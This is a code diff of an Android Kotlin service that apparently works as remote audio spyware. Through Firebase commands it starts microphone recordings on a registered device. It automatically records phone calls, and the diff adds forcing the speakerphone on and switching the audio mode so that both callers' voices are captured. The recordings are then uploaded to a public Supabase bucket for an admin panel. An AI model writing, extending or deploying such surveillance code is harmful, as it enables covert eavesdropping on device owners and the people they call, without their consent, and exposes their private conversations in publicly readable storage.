@@ -38,8 +38,7 @@ class RecordingService : Service() {
         FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
     }
     private val httpClient = OkHttpClient.Builder()
-        .callTimeout(90, java.util.concurrent.TimeUnit.SECONDS)
-        .build()
+        .callTimeout(90, java.util.concurrent.TimeUnit.SECONDS).build()
 
     private var mediaRecorder: MediaRecorder? = null
     private var currentFile: File?   = null
@@ -47,12 +46,11 @@ class RecordingService : Service() {
     private var isRecording          = false
     private var callRecordingEnabled = false
     private var inCall               = false
-    private var speakerWasOn         = false
+    private var originalSpeaker      = false
+    private var originalAudioMode    = AudioManager.MODE_NORMAL
 
     @Suppress("DEPRECATION")
     private var phoneStateListener: PhoneStateListener? = null
-
-    // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     override fun onCreate() {
         super.onCreate()
@@ -78,19 +76,17 @@ class RecordingService : Service() {
         super.onDestroy()
         recordingJob?.cancel()
         safeStopRecorder()
-        restoreSpeaker()
+        restoreAudio()
         @Suppress("DEPRECATION")
         (getSystemService(TELEPHONY_SERVICE) as TelephonyManager)
             .listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
     }
 
-    // ── Notification ──────────────────────────────────────────────────────────
-
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
             getSystemService(NotificationManager::class.java)
                 .createNotificationChannel(NotificationChannel(
-                    "rec_channel", "Recording Service", NotificationManager.IMPORTANCE_LOW))
+                    "rec_channel", "Recording", NotificationManager.IMPORTANCE_LOW))
     }
 
     private fun buildNotification(text: String): Notification =
@@ -102,8 +98,6 @@ class RecordingService : Service() {
 
     private fun updateNotification(text: String) =
         getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
-
-    // ── Firebase Listeners ────────────────────────────────────────────────────
 
     private fun setupFirebaseListeners() {
         database.child("start_recording").addValueEventListener(object : ValueEventListener {
@@ -141,18 +135,10 @@ class RecordingService : Service() {
         })
     }
 
-    // ── Mic Recording (remote command) ────────────────────────────────────────
-
     private fun startMicRecording(durationSec: Long) {
-        doStartRecording(
-            audioSource = MediaRecorder.AudioSource.MIC,
-            type        = "mic",
-            label       = "🔴 Mic recording started (${durationSec}s)",
-            autoDurSec  = durationSec
-        )
+        doStartRecording(MediaRecorder.AudioSource.MIC, "mic",
+            "🔴 Mic recording started (${durationSec}s)", durationSec)
     }
-
-    // ── Call Recording ────────────────────────────────────────────────────────
 
     @Suppress("DEPRECATION")
     private fun setupCallRecording() {
@@ -163,58 +149,61 @@ class RecordingService : Service() {
                     TelephonyManager.CALL_STATE_OFFHOOK -> {
                         if (callRecordingEnabled && !isRecording) {
                             inCall = true
-                            // Switch to speakerphone so BOTH voices go through mic
-                            enableSpeaker()
-                            reportStatus("📞 Call detected — recording (speaker ON)...")
-                            doStartRecording(
-                                audioSource = MediaRecorder.AudioSource.VOICE_COMMUNICATION,
-                                type        = "call",
-                                label       = "📞 Recording call...",
-                                autoDurSec  = 0L   // no auto-stop for calls
-                            )
+                            enableSpeakerForRecording()
+                            reportStatus("📞 Call detected — preparing recording...")
+                            // Delay 800ms for speaker hardware to switch, then record
+                            CoroutineScope(Dispatchers.Main).launch {
+                                delay(800L)
+                                if (inCall && !isRecording) {
+                                    doStartRecording(
+                                        audioSource = MediaRecorder.AudioSource.MIC,
+                                        type        = "call",
+                                        label       = "📞 Recording call (both voices via speaker)...",
+                                        autoDurSec  = 0L
+                                    )
+                                }
+                            }
                         }
                     }
                     TelephonyManager.CALL_STATE_IDLE -> {
                         if (inCall) {
                             inCall = false
-                            restoreSpeaker()
                             if (isRecording) stopAndUpload("call")
+                            restoreAudio()
                         }
                     }
-                    TelephonyManager.CALL_STATE_RINGING ->
-                        reportStatus("📞 Incoming call...")
+                    TelephonyManager.CALL_STATE_RINGING -> reportStatus("📞 Incoming call...")
                 }
             }
         }
         tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
     }
 
-    private fun enableSpeaker() {
+    private fun enableSpeakerForRecording() {
         try {
             val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-            speakerWasOn = am.isSpeakerphoneOn
+            originalSpeaker   = am.isSpeakerphoneOn
+            originalAudioMode = am.mode
+            // Turn speaker ON so both caller and called voices come through mic
             am.isSpeakerphoneOn = true
+            am.mode = AudioManager.MODE_IN_CALL
         } catch (_: Exception) {}
     }
 
-    private fun restoreSpeaker() {
+    private fun restoreAudio() {
         try {
             val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-            am.isSpeakerphoneOn = speakerWasOn
+            am.isSpeakerphoneOn = originalSpeaker
+            am.mode = originalAudioMode
         } catch (_: Exception) {}
     }
-
-    // ── Core: start recorder ──────────────────────────────────────────────────
 
     private fun doStartRecording(
-        audioSource: Int,
-        type: String,
-        label: String,
-        autoDurSec: Long
+        audioSource: Int, type: String, label: String, autoDurSec: Long
     ) {
         try {
             val file = File(cacheDir,
-                "${type}_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.m4a")
+                "${type}_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.m4a")
             currentFile = file
 
             mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
@@ -223,13 +212,13 @@ class RecordingService : Service() {
                 @Suppress("DEPRECATION") MediaRecorder()
 
             mediaRecorder!!.apply {
-                // Try requested source, fall back to MIC
                 try { setAudioSource(audioSource) }
                 catch (_: Exception) { setAudioSource(MediaRecorder.AudioSource.MIC) }
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioSamplingRate(44100)
                 setAudioEncodingBitRate(128_000)
+                setAudioChannels(1)
                 setOutputFile(file.absolutePath)
                 prepare()
                 start()
@@ -258,18 +247,15 @@ class RecordingService : Service() {
         }
     }
 
-    // ── Stop & Upload ─────────────────────────────────────────────────────────
-
     private fun stopAndUpload(type: String) {
         recordingJob?.cancel()
         val file = currentFile ?: run { reportStatus("❌ No file"); return }
         safeStopRecorder()
         isRecording = false
         updateNotification("📤 Uploading $type...")
-        reportStatus("📤 Uploading ${type} (${file.length() / 1024}KB)...")
 
         CoroutineScope(Dispatchers.IO).launch {
-            if (!file.exists() || file.length() < 1024L) {
+            if (!file.exists() || file.length() == 0L) {
                 withContext(Dispatchers.Main) { reportStatus("❌ Recording file empty") }
                 return@launch
             }
@@ -287,17 +273,19 @@ class RecordingService : Service() {
                     withContext(Dispatchers.Main) {
                         if (resp.isSuccessful) {
                             val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
-                            FirebaseDatabase.getInstance(DB_URL)
-                                .getReference("recordings").push()
-                                .setValue(mapOf(
-                                    "deviceId"  to deviceId, "type" to type,
-                                    "url"       to url,
-                                    "timestamp" to System.currentTimeMillis(),
-                                    "fileName"  to fileName
-                                ))
+                            // Write to Firebase (best-effort — admin panel reads Supabase directly)
+                            try {
+                                FirebaseDatabase.getInstance(DB_URL)
+                                    .getReference("recordings").push()
+                                    .setValue(mapOf("deviceId" to deviceId, "type" to type,
+                                        "url" to url, "timestamp" to System.currentTimeMillis(),
+                                        "fileName" to fileName))
+                            } catch (_: Exception) {}
                             reportStatus("✅ ${type} uploaded (${file.length() / 1024}KB)")
                             updateNotification("✅ Uploaded")
-                        } else reportStatus("❌ Upload ${resp.code}: ${resp.body?.string()?.take(80)}")
+                        } else {
+                            reportStatus("❌ Upload ${resp.code}: ${resp.body?.string()?.take(80)}")
+                        }
                     }
                 }
                 file.delete()
